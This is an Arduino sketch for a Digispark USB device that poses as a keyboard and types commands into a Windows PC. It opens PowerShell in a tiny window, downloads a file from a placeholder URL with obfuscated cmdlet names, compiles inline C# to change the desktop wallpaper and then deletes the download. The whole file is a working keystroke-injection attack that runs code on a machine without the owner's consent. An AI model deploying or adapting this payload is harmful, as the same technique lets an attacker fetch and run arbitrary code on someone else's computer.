//by SKocur

#include "DigiKeyboard.h"

#define IMAGE_URL "https:URL_TO_IMAGE.jpg" //full url, the shorter the faster
#define IMAGE_EXTENSION "jpg" //set file extension, tested on: png, jpg

void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell");
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("(N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\"" IMAGE_URL "\",\"$env:TEMP\\sk." IMAGE_EXTENSION "\")"));
  DigiKeyboard.delay(100);
  DigiKeyboard.println(F("$a = @\""));
  DigiKeyboard.println(F("using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\",SetLastError=true,CharSet=CharSet.Auto)]static extern int SystemParametersInfo(int a,int b,string c,int d);public static void AA(string p){SystemParametersInfo(20,0,p,0x01|0x02);}}"));
  DigiKeyboard.println("\"@");
  DigiKeyboard.println("Add-Type -TypeDefinition $a");
  DigiKeyboard.println("[W]::AA(\"$env:TEMP\\sk." IMAGE_EXTENSION "\");cd $env:TEMP;Remove-Item sk." IMAGE_EXTENSION ";exit;");
  DigiKeyboard.println("exit");
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
